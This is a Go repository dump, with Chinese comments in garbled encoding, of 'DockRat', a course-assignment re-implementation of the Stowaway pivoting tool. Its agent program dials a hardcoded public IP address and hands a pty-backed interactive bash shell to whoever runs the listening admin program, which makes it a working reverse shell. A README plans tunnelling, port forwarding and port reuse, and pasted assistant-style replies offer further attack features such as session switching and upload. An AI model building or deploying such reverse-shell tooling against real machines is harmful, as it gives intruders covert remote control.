å­æ–‡ä»¶å¤¹ï¼š./cmd
å­æ–‡ä»¶å¤¹ï¼š./cmd/admin
æ–‡ä»¶ï¼š./cmd/admin/main.go
å†…å®¹ï¼š
// === /cmd/admin/main.go ===
// === file info ===
// admin è¡Œä¸ºï¼š
// è¾“å…¥æ¯æ¡å‘½ä»¤ï¼ˆå¦‚ cd /tmpã€lsï¼‰

// ç¼–ç ä¸ºç»“æ„åŒ–åè®® {"type": "exec", "data": "cd /tmp"}

// ç­‰å¾…ç»“æœè¿”å›åæ˜¾ç¤º

package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"

	"github.com/Singert/DockRat/core/protocol"
)

// func main() {
// 	ln, err := net.Listen("tcp", ":9999")
// 	if err != nil {
// 		panic(err)
// 	}
// 	fmt.Println("[*] Waiting for agent to connect...")
// 	conn, err := ln.Accept()
// 	if err != nil {
// 		panic(err)
// 	}
// 	defer conn.Close()
// 	fmt.Println("[*] Agent connected.")

// 	// goroutine æ¥æ”¶è¿”å›ç»“æœ
// 	go func() {
// 		scanner := bufio.NewScanner(conn)
// 		for scanner.Scan() {
// 			var msg protocol.Message
// 			if err := json.Unmarshal(scanner.Bytes(), &msg); err == nil && msg.Type == "result" {
// 				fmt.Print(msg.Data)
// 			}
// 		}
// 	}()

// 	stdin := bufio.NewScanner(os.Stdin)
// 	fmt.Println("[*] Enter 'exit' to quit.")
// 	for {
// 		fmt.Print("Admin> ")
// 		if !stdin.Scan() {
// 			break
// 		}
// 		cmd := stdin.Text()
// 		if cmd == "exit" {
// 			data, _ := protocol.Encode(protocol.Message{Type: "exit", Data: ""})
// 			conn.Write(append(data, '\n'))
// 			break
// 		}
// 		msg := protocol.Message{Type: "exec", Data: cmd}
// 		data, _ := protocol.Encode(msg)
// 		conn.Write(append(data, '\n'))
// 	}
// }

// func main() {
// 	ln, err := net.Listen("tcp", ":9999")
// 	if err != nil {
// 		panic(err)
// 	}
// 	fmt.Println("[*] Waiting for agent to connect...")

// 	conn, err := ln.Accept()
// 	if err != nil {
// 		panic(err)
// 	}
// 	defer conn.Close()
// 	fmt.Println("[*] Agent connected.")
// 	fmt.Println("[*] Enter 'shell' to start interactive session.")

// 	stdin := bufio.NewScanner(os.Stdin)
// 	for {
// 		fmt.Print("Admin> ")
// 		if !stdin.Scan() {
// 			break
// 		}
// 		line := stdin.Text()
// 		if line == "shell" {
// 			msg := protocol.Message{Type: "cmd", Data: ""}
// 			data, _ := protocol.Encode(msg)
// 			conn.Write(append(data, '\n'))

// 			fmt.Println("[*] Switched to interactive shell. Press Ctrl+C to exit.")

// 			// ğŸ”„ æ–°å¢åŒå‘å¼‚æ­¥äº¤äº’
// 			done := make(chan struct{})

// 			// è¾“å…¥æµï¼šadmin â†’ agent shell
// 			go func() {
// 				_, _ = io.Copy(conn, os.Stdin)
// 				done <- struct{}{}
// 			}()

// 			// è¾“å‡ºæµï¼šagent shell â†’ admin
// 			go func() {
// 				_, _ = io.Copy(os.Stdout, conn)
// 				done <- struct{}{}
// 			}()

// 			<-done // ä»»ä¸€æ–¹å‘æ–­å¼€å°±é€€å‡º
// 			break
// 		}
// 	}
// }

func main() {
	ln, err := net.Listen("tcp", ":9999")
	if err != nil {
		panic(err)
	}
	fmt.Println("[*] Waiting for agent to connect...")

	conn, err := ln.Accept()
	if err != nil {
		panic(err)
	}
	defer conn.Close()
	fmt.Println("[*] Agent connected.")
	fmt.Println("[*] Enter 'shell' to start interactive session.")

	stdin := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("Admin> ")
		if !stdin.Scan() {
			break
		}
		line := stdin.Text()
		if line == "shell" {
			// å‘é€è¿›å…¥ shell æ¨¡å¼çš„è¯·æ±‚
			msg := protocol.NewCommand("")
			data, _ := protocol.EncodeWithNewline(msg)
			conn.Write(data)

			fmt.Println("[*] Switched to interactive shell. Press Ctrl+C or 'exit' to quit.")
			startInteractiveShell(conn)
			break
		}
	}
}

// âœ… æ–°å¢å‡½æ•°ï¼šä½¿ç”¨ pty æ¨¡æ‹Ÿ admin æœ¬åœ°ç»ˆç«¯ï¼Œè¿æ¥è¿œç¨‹ shell
func startInteractiveShell(conn net.Conn) {
	fmt.Fprintln(os.Stderr, "[*] Shell session started. Press Ctrl+C to exit.")

	// åŒå‘æ¡¥æ¥ conn <=> admin çš„æ§åˆ¶å°
	done := make(chan struct{})

	// ç”¨æˆ·è¾“å…¥ -> å‘é€ç»™ agent shell
	go func() {
		_, _ = io.Copy(conn, os.Stdin)
		done <- struct{}{}
	}()

	// agent shell è¾“å‡º -> æ˜¾ç¤ºåœ¨ admin æ§åˆ¶å°
	go func() {
		_, _ = io.Copy(os.Stdout, conn)
		done <- struct{}{}
	}()

	<-done // ä»»ä¸€æ–¹å‘æ–­å¼€åˆ™é€€å‡º
}

å­æ–‡ä»¶å¤¹ï¼š./cmd/agent
æ–‡ä»¶ï¼š./cmd/agent/main.go
å†…å®¹ï¼š
// === /cmd/agent/main.go ===
// === file info ===
// agent è¡Œä¸ºï¼š
// å¯åŠ¨æ—¶è¿è¡Œä¸€ä¸ª bash æˆ– cmd.exe

// é€šè¿‡ cmd.StdinPipe() å’Œ cmd.StdoutPipe() ä¸ä¹‹äº¤äº’

// å°†æ¯æ¡ admin å‘æ¥çš„å‘½ä»¤å†™å…¥ shell çš„æ ‡å‡†è¾“å…¥

// å°†ç»“æœï¼ˆstdout/stderrï¼‰è¿”å›ç»™ admin
package main

import (
	"bufio"
	"fmt"
	"net"

	"github.com/Singert/DockRat/core/protocol"
	"github.com/Singert/DockRat/core/shell"
)

// func main() {
// 	conn, err := net.Dial("tcp", "127.0.0.1:9999")
// 	if err != nil {
// 		fmt.Println("Connect error:", err)
// 		return
// 	}
// 	defer conn.Close()

// 	session, err := shell.StartSession("bash") // or cmd.exe on Windows
// 	if err != nil {
// 		fmt.Println("Shell start error:", err)
// 		return
// 	}

// 	dispatcher := protocol.NewDispatcher()

// 	dispatcher.Register("exec", func(msg protocol.Message) error {
// 		output, err := session.Exec(msg.Data)
// 		if err != nil {
// 			output = "[ERROR] " + err.Error()
// 		}
// 		resp, _ := protocol.Encode(protocol.Message{
// 			Type: "result",
// 			Data: output,
// 		})
// 		conn.Write(append(resp, '\n'))
// 		return nil
// 	})

// 	dispatcher.Register("exit", func(msg protocol.Message) error {
// 		conn.Close()
// 		os.Exit(0)
// 		return nil
// 	})

// 	fmt.Println("[*] Agent ready.")
// 	_ = dispatcher.Listen(conn)
// }

//TODO:ğŸš€ ä¸‹ä¸€æ­¥æ¨è
// ä½ ç°åœ¨å·²ç»å®Œæˆï¼š

// æŒä¹…è¿æ¥

// åè®®è°ƒåº¦

// åè®®é©±åŠ¨çš„è¡Œä¸ºï¼ˆshell/exitï¼‰

// âœ… æ¥ä¸‹æ¥ä½ å¯ä»¥è€ƒè™‘ï¼š

// å¢åŠ  node ID ç»“æ„ï¼Œæ”¯æŒ use/select æ§åˆ¶å¤šä¸ªèŠ‚ç‚¹

// æ·»åŠ  forward/backward è½¬å‘å‘½ä»¤æ”¯æŒ

// å»ºç«‹ topo ç»“æ„ï¼Œç»´æŠ¤å¤šçº§æ‹“æ‰‘

// æ˜¯å¦éœ€è¦æˆ‘ç»§ç»­ä¸ºä½ æ·»åŠ  èŠ‚ç‚¹ç»“æ„ å’Œ å¤šçº§è½¬å‘ çš„é€»è¾‘åŸºç¡€ï¼Ÿ

func main() {
	conn, err := net.Dial("tcp", "45.89.233.225:9999")
	if err != nil {
		panic(err)
	}
	defer conn.Close()
	fmt.Println("[*] Connected to admin.")

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		msg, err := protocol.Decode(scanner.Bytes())
		if err != nil {
			continue
		}
		if msg.Type == "cmd" {
			fmt.Println("[*] Launching interactive shell...")
			_ = shell.StartShellIO(conn, "bash")
			break
		}
	}
}

æ–‡ä»¶ï¼š./cmd/design.md
å†…å®¹ï¼š
å¥½é—®é¢˜ã€‚æˆ‘ä»¬æ¥**ç²¾ç¡®åŒºåˆ†**è¿™ä¸¤ç§æ–¹å¼å¯¹â€œæŒä¹…åŒ– shell sessionâ€çš„æ”¯æŒæƒ…å†µã€‚

---

## âœ… ä½ ç°åœ¨æœ‰ä¸¤ç§è¿œç¨‹ shell æ¨¡å¼ï¼š

| æ¨¡å¼ç±»å‹                     | æè¿°                                | æ˜¯å¦æŒä¹…åŒ– | ç”¨é€”                      |
| ------------------------ | --------------------------------- | ----- | ----------------------- |
| **ç»“æ„åŒ–äº¤äº’ (`exec`)**       | åå°ç»´æŠ¤ä¸€ä¸ª shell å®ä¾‹ï¼Œæ¯æ¡å‘½ä»¤å‘é€åæ‰§è¡Œ         | âœ… æ˜¯   | è‡ªåŠ¨åŒ–ã€ä¸€æ¬¡ä¸€æ¡å‘½ä»¤ã€åå°æ‰§è¡Œ         |
| **å®Œæ•´ pty shell (`cmd`)** | å¯åŠ¨ä¸€ä¸ª bashï¼Œå¼€å¯ pty ç»ˆç«¯åŒå‘æµ io.Copy æ¨¡å¼ | âœ… æ˜¯   | æ¨¡æ‹Ÿ sshï¼Œæ‰‹åŠ¨äº¤äº’ã€cdã€å†å²ã€æç¤ºç¬¦ä¿ç•™ |

---

## âœ… æ‰€ä»¥ç­”æ¡ˆæ˜¯ï¼š**æ˜¯çš„ï¼Œä»ç„¶æŒä¹…åŒ–ï¼Œè€Œä¸”æ›´çœŸå®**

ä½ è°ƒç”¨çš„æ˜¯ï¼š

```go
cmd := exec.Command("bash")
ptmx, _ := pty.Start(cmd)
```

åªè¦ï¼š

* è¿™ä¸ª `cmd` æ²¡æœ‰é€€å‡º
* ä½ æ²¡å…³é—­ `ptmx`

å®ƒå°±**æŒç»­å­˜åœ¨**ï¼Œä½ åœ¨å…¶ä¸­æ‰§è¡Œçš„ `cd`ã€`export`ã€`alias`ã€å‡½æ•°å®šä¹‰ç­‰éƒ½ **ä¿ç•™ä¸Šä¸‹æ–‡**ã€‚

---

## âœ… ä¸¾ä¾‹è¯æ˜ï¼š

```bash
Admin> shell
$ cd /tmp
$ touch x
$ ls
x
$ export TEST=123
$ echo $TEST
123
```

ä½ é€€å‡º shellï¼ˆ`exit`ï¼‰æ‰ä¼šå…³é—­å®ƒã€‚

---

## ğŸ§  æ€»ç»“ï¼š

| ç‰¹æ€§               | `exec` æ¨¡å¼ | `shell` æ¨¡å¼ï¼ˆptyï¼‰ |
| ---------------- | --------- | --------------- |
| æŒä¹…ä¸Šä¸‹æ–‡ï¼ˆcd/exportï¼‰ | âœ… æ˜¯       | âœ… æ˜¯             |
| è¾“å‡ºç»“æ„åŒ–            | âœ… æ˜¯       | âŒï¼ˆåŸå§‹ç»ˆç«¯æµï¼‰        |
| å¯è„šæœ¬åŒ–             | âœ… é€‚åˆ      | âŒ ä¸é€‚åˆ           |
| æ¨¡æ‹Ÿç»ˆç«¯             | âŒ å¦       | âœ… å®Œæ•´ bash       |
| ä¿ç•™æç¤ºç¬¦/è¡¥å…¨         | âŒ å¦       | âœ… æœ‰ bash è¡Œä¸º     |

---

ä½ å®Œå…¨å¯ä»¥åŒæ¨¡å…±å­˜ï¼š

* è‡ªåŠ¨å‘½ä»¤ï¼šç”¨ `exec`
* æ‰‹åŠ¨æ§åˆ¶ï¼šç”¨ `shell`

---

éœ€è¦æˆ‘ä¸ºä½ å»ºç«‹ä¸€ä¸ªçŠ¶æ€æœºï¼Œæ”¯æŒå¤šèŠ‚ç‚¹é—´åˆ‡æ¢ shell ä¼šè¯ï¼ˆå¦‚ Metasploit çš„ `sessions -i 1`ï¼‰å—ï¼Ÿæˆ–è€…ç°åœ¨åŠ ä¸Š `upload`ï¼Ÿ

æ–‡ä»¶ï¼š./cmd/main.go
å†…å®¹ï¼š
// cmd/main.go
package main

// import (
// 	"fmt"
// 	"net"
// 	"os"

// 	"github.com/Singert/DockRat/core/node"
// 	"github.com/Singert/DockRat/core/protocol"
// )

// func main() {
// 	if len(os.Args) < 2 {
// 		fmt.Println(fmt.Println("Usage: stowaway <admin|agent>"))
// 		return
// 	}
// 	role := os.Args[1]

// 	switch role {
// 	case "admin":
// 		startAdmin()
// 	case "agent":
// 		startAgent()
// 	default:
// 		fmt.Println("unknown role")
// 	}
// }

// func startAdmin() {
// 	fmt.Println("Starting Admin")

// 	ln, err := net.Listen("tcp", ":9999")
// 	if err != nil {
// 		fmt.Println("error listening:", err)
// 		return
// 	}
// 	fmt.Println("admin is listening on")
// 	nodeManager := node.NewNoddManager()
// 	for {
// 		conn, err := ln.Accept()
// 		if err != nil {
// 			fmt.Println("error accept connection: ", err)
// 			continue
// 		}
// 		nodeID := nodeManager.AddNode(conn)
// 		fmt.Println("New agent connected with ID:", nodeID)
// 		go protocol.HandleConn(conn, true, nodeID)
// 	}

// }

// func startAgent() {
// 	conn, err := net.Dial("tcp", "127.0.0.1:9999")
// 	if err != nil {
// 		fmt.Println("error connecting to admin:", err)
// 		return
// 	}
// 	fmt.Println("Connected to admin")
// 	protocol.HandleConn(conn, false, -1)
// }

å­æ–‡ä»¶å¤¹ï¼š./core
å­æ–‡ä»¶å¤¹ï¼š./core/crypto
å­æ–‡ä»¶å¤¹ï¼š./core/filetransfer
å­æ–‡ä»¶å¤¹ï¼š./core/node
æ–‡ä»¶ï¼š./core/node/node.go
å†…å®¹ï¼š
// core/node/manager.go
// Package node provides the NodeManager struct and its methods for managing nodes.

package node

import (
	"net"
	"sync"
)

type NodeManager struct {
	mu    sync.Mutex
	nodes map[int]net.Conn
	next  int
}

func NewNoddManager() *NodeManager {
	return &NodeManager{
		nodes: make(map[int]net.Conn),
		next:  0,
	}
}

func (nm *NodeManager) AddNode(conn net.Conn) int {
	nm.mu.Lock()
	defer nm.mu.Unlock()

	nodeID := nm.next
	nm.nodes[nodeID] = conn
	nm.next++

	return nodeID
}

func (nm *NodeManager) Get(nodeID int) (net.Conn, bool) {
	nm.mu.Lock()
	defer nm.mu.Unlock()

	conn, ok := nm.nodes[nodeID]
	return conn, ok
}

func (nm *NodeManager) Remove(nodeID int) {
	nm.mu.Lock()
	defer nm.mu.Unlock()
	delete(nm.nodes, nodeID)
}

å­æ–‡ä»¶å¤¹ï¼š./core/protocol
æ–‡ä»¶ï¼š./core/protocol/dispatcher.go
å†…å®¹ï¼š
// === core/protocol/protocol.go ===

package protocol

import (
	"bufio"
	"fmt"
	"net"
	"strings"
)

type HandlerFunc func(msg Message) error

type Dispatcher struct {
	handlers map[string]HandlerFunc
}

func NewDispatcher() *Dispatcher {
	return &Dispatcher{
		handlers: make(map[string]HandlerFunc),
	}
}

func (d *Dispatcher) Register(msgType string, handler HandlerFunc) {
	d.handlers[msgType] = handler
}

func (d *Dispatcher) Dispatch(msg Message) error {
	h, ok := d.handlers[msg.Type]
	if !ok {
		return fmt.Errorf("unhandled message type: %s", msg.Type)
	}
	return h(msg)
}

func (d *Dispatcher) Listen(conn net.Conn) error {
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.TrimSpace(line) == "" {
			continue
		}
		msg, err := Decode([]byte(line))
		if err != nil {
			return fmt.Errorf("error decoding message: %v", err)
		}
		if err := d.Dispatch(msg); err != nil {
			return fmt.Errorf("error dispatching message: %v", err)
		}
	}
	return scanner.Err()
}

func (d *Dispatcher) ListenOnce(conn net.Conn) error {
	scanner := bufio.NewScanner(conn)
	if scanner.Scan() {
		msg, err := Decode(scanner.Bytes())
		fmt.Printf("[*] Received message:%+v\n", msg)
		if err != nil {
			return err
		}
		if handler, ok := d.handlers[msg.Type]; ok {
			return handler(msg)
		}
		return fmt.Errorf("unhandled message type: %s", msg.Type)
	}
	return scanner.Err()
}

æ–‡ä»¶ï¼š./core/protocol/protocol.go
å†…å®¹ï¼š
// === core/protocol/protocol.go ===
package protocol

import "encoding/json"

// func HandleConn(conn net.Conn, isAdmin bool, nodeID int) {
// 	defer conn.Close()

// 	if isAdmin {
// 		handleAdmin(conn, nodeID)
// 	} else {
// 		handleAgent(conn)
// 	}
// }

// func handleAdmin(conn net.Conn, nodeID int) {
// 	scanner := bufio.NewScanner(os.Stdin)
// 	writer := bufio.NewWriter(conn)
// 	r := bufio.NewReader(conn)
// 	fmt.Print("Shell> ")
// 	for scanner.Scan() {
// 		line := scanner.Text()
// 		writer.WriteString(line + "\n")
// 		writer.Flush()
// 		fmt.Printf("[node %d] shell", nodeID)
// 		for {
// 			response, err := r.ReadString('\n')
// 			if err != nil {
// 				fmt.Println("error reading from agent:", err)
// 				break
// 			}
// 			if response == "__END__\n" {
// 				break
// 			}
// 			fmt.Print(response)
// 		}

// 		fmt.Print("[Node %d]Shell> ")
// 	}
// }

// func handleAgent(conn net.Conn) {
// 	sacnner := bufio.NewScanner(conn)
// 	writer := bufio.NewWriter(conn)
// 	for sacnner.Scan() {
// 		line := sacnner.Text()
// 		output := shell.ExecCommand(line)
// 		writer.WriteString(output)
// 		writer.WriteString("\n__END__\n")
// 		writer.Flush()
// 	}
// }

type Message struct {
	Type string `json:"type"` //"cmd | exit"
	Data string `json:"data"`
}

func Encode(msg Message) ([]byte, error) {
	return json.Marshal(msg)
}

func EncodeWithNewline(msg Message) ([]byte, error) {
	data, err := Encode(msg)
	if err != nil {
		return nil, err
	}
	return append(data, '\n'), nil
}

func Decode(data []byte) (Message, error) {
	var msg Message
	err := json.Unmarshal(data, &msg)
	return msg, err
}

func NewCommand(cmd string) Message {
	return Message{
		Type: "cmd",
		Data: cmd,
	}
}
func NewExit() Message {
	return Message{
		Type: "exit",
	}
}

å­æ–‡ä»¶å¤¹ï¼š./core/shell
æ–‡ä»¶ï¼š./core/shell/interactive.go
å†…å®¹ï¼š
// === /core/shell/interactive.go ===
package shell

import (
	"fmt"
	"io"
	"os"
	"os/exec"

	"github.com/creack/pty"
)

func StartShellIO(conn io.ReadWriter, shell string) error {
	cmd := exec.Command("bash", "-i")
	cmd.Env = append(os.Environ(), "TERM=xterm-256color")
	// âœ… è®¾ç½®åˆå§‹çª—å£å¤§å°ï¼šå¸¸è§„ 80x24
	ptmx, err := pty.StartWithSize(cmd, &pty.Winsize{
		Rows: 24,
		Cols: 80,
	})
	if err != nil {
		return err
	}
	defer func() {
		_ = ptmx.Close()
		_ = cmd.Process.Kill()
	}()

	fmt.Fprintln(os.Stderr, "[*] Shell session started.")
	go io.Copy(ptmx, conn)     // admin -> shell
	_, _ = io.Copy(conn, ptmx) // shell -> admin
	return nil
}

// func handleInteractive(conn net.Conn) {
// 	fmt.Println("[*] Switched to interactive shell. Press Ctrl+C to exit.")

// 	done := make(chan struct{})

// 	// admin -> agent (stdin -> conn)
// 	go func() {
// 		_, _ = io.Copy(conn, os.Stdin)
// 		done <- struct{}{}
// 	}()

// 	// agent -> admin (conn -> stdout)
// 	go func() {
// 		_, _ = io.Copy(os.Stdout, conn)
// 		done <- struct{}{}
// 	}()

// 	<-done // wait for either direction to close
// }

æ–‡ä»¶ï¼š./core/shell/shell.go
å†…å®¹ï¼š
// core/shell/shell.go
package shell

import (
	"bufio"
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"sync"
	"syscall"

	"github.com/creack/pty"
)

type ShellSession struct {
	cmd    *exec.Cmd
	ptmx   *os.File
	reader *bufio.Reader
	mu     sync.Mutex
	shell  string
}

// StartSession å¯åŠ¨ä¸€ä¸ªæ–°çš„ shell ä¼šè¯
func StartSession(shell string) (*ShellSession, error) {
	session := &ShellSession{shell: shell}
	err := session.spawn()
	if err != nil {
		return nil, err
	}
	return session, nil
}

// spawn ç”¨äºåˆå§‹åŒ–/é‡å¯ shell
func (s *ShellSession) spawn() error {
	cmd := exec.Command(s.shell)
	ptmx, err := pty.Start(cmd)
	if err != nil {
		return err
	}
	s.cmd = cmd
	s.ptmx = ptmx
	s.reader = bufio.NewReader(ptmx)
	return nil
}

// Exec å‘ shell å‘é€å‘½ä»¤ï¼Œå¹¶è¯»å–ç›´åˆ°ç‰¹æ®Šè¡Œ
func (s *ShellSession) Exec(command string) (string, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	if !s.IsAlive() {
		return "", fmt.Errorf("shell is not running")
	}

	tag := "###END###"
	fullCmd := fmt.Sprintf("%s\necho %s\n", command, tag)
	if _, err := s.ptmx.Write([]byte(fullCmd)); err != nil {
		return "", err
	}

	var buf bytes.Buffer
	for {
		line, err := s.reader.ReadString('\n')
		if err != nil {
			break
		}
		if strings.Contains(line, tag) {
			break
		}
		buf.WriteString(line)
	}
	return buf.String(), nil
}

// Kill ä¼˜é›…å…³é—­ shell
func (s *ShellSession) Kill() error {
	s.mu.Lock()
	defer s.mu.Unlock()

	if s.ptmx != nil {
		_ = s.ptmx.Close()
	}
	if s.cmd != nil && s.cmd.Process != nil {
		return s.cmd.Process.Kill()
	}
	return nil
}

// IsAlive åˆ¤æ–­ shell æ˜¯å¦ä»åœ¨è¿è¡Œ
func (s *ShellSession) IsAlive() bool {
	if s.cmd == nil || s.cmd.Process == nil {
		return false
	}
	// è°ƒç”¨ç³»ç»Ÿ syscall æ£€æŸ¥è¿›ç¨‹æ˜¯å¦è¿˜æ´»ç€
	err := s.cmd.Process.Signal(syscall.Signal(0))
	return err == nil
}

// Reset é‡å¯ shell ä¼šè¯
func (s *ShellSession) Reset() error {
	_ = s.Kill()
	return s.spawn()
}

å­æ–‡ä»¶å¤¹ï¼š./core/transport
å­æ–‡ä»¶å¤¹ï¼š./core/tunnel
æ–‡ä»¶ï¼š./go.mod
å†…å®¹ï¼š
module github.com/Singert/DockRat

go 1.23.2

require github.com/creack/pty v1.1.24

æ–‡ä»¶ï¼š./go.sum
å†…å®¹ï¼š
github.com/creack/pty v1.1.24 h1:bJrF4RRfyJnbTJqzRLHzcGaZK1NeM5kTC9jGgovnR1s=
github.com/creack/pty v1.1.24/go.mod h1:08sCNb52WyoAwi2QDyzUCTgcvVFhUzewun7wtTfvcwE=

æ–‡ä»¶ï¼š./LICENSE
å†…å®¹ï¼š
MIT License

Copyright (c) 2025 Singert

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

This project is a full re-implementation inspired by the original [Stowaway](https://github.com/ph4ntonn/Stowaway) project, which is licensed under the MIT License.

å­æ–‡ä»¶å¤¹ï¼š./Makefile
æ–‡ä»¶ï¼š./output.txt
å†…å®¹ï¼š

å­æ–‡ä»¶å¤¹ï¼š./pkg
æ–‡ä»¶ï¼š./README.md
å†…å®¹ï¼š
# DockRat
è¯¾ç¨‹ä½œä¸š-å¯¹é¡¹ç›®Stowawayçš„ä»¿å†™
å¤åˆ» **Stowaway** é¡¹ç›®æ¶‰åŠå¤šä¸ªæ–¹é¢ï¼ŒåŒ…æ‹¬å¤šçº§ç½‘ç»œé€šä¿¡ã€å‘½ä»¤è°ƒåº¦ã€èŠ‚ç‚¹ç®¡ç†ã€TLS/åŠ å¯†é€šä¿¡ã€æ–‡ä»¶ä¼ è¾“ç­‰åŠŸèƒ½ï¼Œæ•´ä¸ªä½“ç³»è®¾è®¡å¤æ‚ä½†é€»è¾‘æ¸…æ™°ã€‚ä»¥ä¸‹æ˜¯å¤åˆ»è¯¥é¡¹ç›®çš„æ•´ä½“æŠ€æœ¯è·¯çº¿å’Œæ¨¡å—å»ºè®®ï¼š

---

## ğŸ§© æ ¸å¿ƒåŠŸèƒ½æ¨¡å—åˆ’åˆ†

### 1. **åŸºç¡€é€šä¿¡å±‚ï¼ˆCore Transportï¼‰**

* æ”¯æŒ TCP/HTTP/WebSocket ä¸‰ç§åè®®é€šä¿¡ï¼ˆè£¸TCPã€HTTPæ¶ˆæ¯å°è£…ã€WebSocketé•¿è¿æ¥ï¼‰
* æ”¯æŒä¸»åŠ¨è¿æ¥ï¼ˆClientï¼‰å’Œè¢«åŠ¨ç›‘å¬ï¼ˆServerï¼‰æ¨¡å¼
* æ”¯æŒ Socks5/HTTP ä»£ç†ç©¿é€
* å¯é€‰ TLS åŠ å¯†ï¼ˆå»ºè®®ä½¿ç”¨ `crypto/tls` æ ‡å‡†åº“ï¼‰
* å®ç°é€šä¿¡å¿ƒè·³æœºåˆ¶ï¼Œä¿æŒè¿æ¥æ´»æ€§

### 2. **åŠ å¯†æ¨¡å—ï¼ˆCrypto Layerï¼‰**

* ä½¿ç”¨å¯¹ç§°åŠ å¯†ï¼ˆå¦‚ AES-256-GCMï¼‰åŠ å¯†èŠ‚ç‚¹é—´ä¼ è¾“çš„æ•°æ®æµ
* å¯†é’¥äº¤æ¢åŸºäºé¢„å…±äº«å¯†é’¥ï¼ˆå¯é€‰ Diffie-Hellman æ”¹è¿›ï¼‰
* TLS å’Œ AES å¯ç‹¬ç«‹æ§åˆ¶ï¼ˆä½¿ç”¨ TLS æ—¶ç¦ç”¨ AESï¼‰

### 3. **èŠ‚ç‚¹ç®¡ç†æ¨¡å—ï¼ˆNode Treeï¼‰**

* æ„é€ åŸºäºæ ‘çš„ç½‘ç»œç»“æ„ï¼ˆæ¯ä¸ªèŠ‚ç‚¹æœ‰çˆ¶èŠ‚ç‚¹å’Œå¤šä¸ªå­èŠ‚ç‚¹ï¼‰
* ç®¡ç†æ¯ä¸ªèŠ‚ç‚¹çš„çŠ¶æ€ï¼ˆä¸Šçº¿/æ‰çº¿ï¼‰ã€ä»£ç†æœåŠ¡ï¼ˆsocks/forward/backwardï¼‰ã€å¤‡æ³¨ç­‰ä¿¡æ¯
* å¤šèŠ‚ç‚¹é—´é€šè¿‡ ID æˆ–ç¼–å·è¯†åˆ«ï¼Œä¿æŒæ‹“æ‰‘å›¾å®æ—¶æ›´æ–°

### 4. **å‘½ä»¤æ§åˆ¶åè®®ï¼ˆCommand Protocolï¼‰**

* å®šä¹‰ç»Ÿä¸€çš„æŒ‡ä»¤æ ¼å¼ï¼ˆJSONæˆ–è‡ªå®šä¹‰åè®®ï¼‰
* å…¸å‹æŒ‡ä»¤ï¼šconnectã€listenã€sshã€shellã€forwardã€backwardã€uploadã€downloadã€shutdown ç­‰
* å»ºè®®ä½¿ç”¨çŠ¶æ€æœºæ¥è§£æå¤„ç†å‘½ä»¤ï¼ˆæ”¯æŒ command dispatchï¼‰

### 5. **ç®¡ç†ç«¯ç•Œé¢ï¼ˆAdmin CLIï¼‰**

* è®¾è®¡ä¸€ä¸ªäº¤äº’å¼ CLIï¼ˆå¸¦å‘½ä»¤å†å²ã€è¡¥å…¨ã€å¯¼èˆªï¼‰
* çŠ¶æ€å±•ç¤ºå¦‚ `detail` / `topo`
* èŠ‚ç‚¹ `use` åæ”¯æŒå­å‘½ä»¤ï¼ˆèŠ‚ç‚¹æœåŠ¡ç®¡ç†ï¼‰

### 6. **æ–‡ä»¶ä¼ è¾“æ¨¡å—**

* è‡ªå®šä¹‰ç®€æ˜“ä¼ è¾“åè®®ï¼ˆå¤´ä¿¡æ¯+é•¿åº¦+æ•°æ®å—ï¼‰
* æ–­ç‚¹ç»­ä¼ ã€ä¸Šä¼ ä¸‹è½½æ–‡ä»¶ï¼Œå¸¦è¿›åº¦æ˜¾ç¤º

### 7. **ç«¯å£è½¬å‘æ¨¡å—**

* `forward`: Adminç›‘å¬æœ¬åœ°ç«¯å£ï¼Œå°†æµé‡è½¬å‘ç»™è¿œç¨‹èŠ‚ç‚¹çš„ç›®æ ‡ç«¯å£
* `backward`: Agentç›‘å¬æœ¬åœ°ç«¯å£ï¼Œåå‘å°†æµé‡è½¬å‘å›Adminç«¯å£
* æ”¯æŒå¤šè¿æ¥ã€è¿æ¥ç®¡ç†

### 8. **ç«¯å£å¤ç”¨æ¨¡å—ï¼ˆé«˜çº§åŠŸèƒ½ï¼‰**

* Linuxï¼šæ”¯æŒ `iptables` é‡å®šå‘
* Windows/Macï¼šä½¿ç”¨ `SO_REUSEPORT` å’Œ `SO_REUSEADDR`
* æä¾›è„šæœ¬å’Œ agent é…ç½®äº¤äº’ï¼Œç¡®ä¿å¤ç”¨å‰åæœåŠ¡æ­£å¸¸

---

## ğŸ› ï¸ æŠ€æœ¯é€‰å‹å»ºè®®ï¼ˆGo å®ç°ï¼‰

| åŠŸèƒ½     | æ¨èåŒ…/å·¥å…·                                                         |
| ------ | -------------------------------------------------------------- |
| ç½‘ç»œé€šä¿¡   | `net`, `net/http`, `golang.org/x/net/websocket`                |
| TLS åŠ å¯† | `crypto/tls`                                                   |
| AES åŠ å¯† | `crypto/aes`, `crypto/cipher`                                  |
| å‘½ä»¤è¡Œäº¤äº’  | `github.com/c-bata/go-prompt`, `github.com/AlecAivazis/survey` |
| å¹¶å‘å¤„ç†   | `goroutines`, `channels`, `sync.Map`                           |
| æ—¥å¿—è®°å½•   | `log`, `github.com/sirupsen/logrus`                            |
| è·¨å¹³å°æ„å»º  | `Makefile`, `go build` with `GOOS` / `GOARCH`                  |
| å¤šå¹³å°æ”¯æŒ  | `build constraints`, ç¼–è¯‘æ—¶ç”¨ `GOARCH=arm/mips` ç­‰                  |
